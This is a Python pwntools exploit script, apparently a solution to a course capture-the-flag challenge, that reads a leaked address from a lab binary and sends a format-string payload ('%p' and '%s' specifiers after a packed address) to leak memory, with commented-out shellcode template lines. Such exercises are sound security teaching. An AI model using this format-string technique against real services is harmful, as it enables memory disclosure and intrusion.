#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template exe
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("exe")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("cs412.polygl0ts.ch", 9003)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES BRRRR
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

if args.GDB:
    io.interactive()
if args.REMOTE:
    log.info(io.recv())


log.info(io.recvline())
received = io.recvline(keepends=False)
log.info(received)

addr = int(received[-8:], 16)

attack = p32(addr) + b" %p %p %p %p %p %p %s %p %p"
#attack = b"AAAAAAAAAAAAAA" + b" %p %p %p %p %p %p %s %p"

log.info("Payload is %s", attack)

log.info(io.recvline())

io.sendline(attack)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
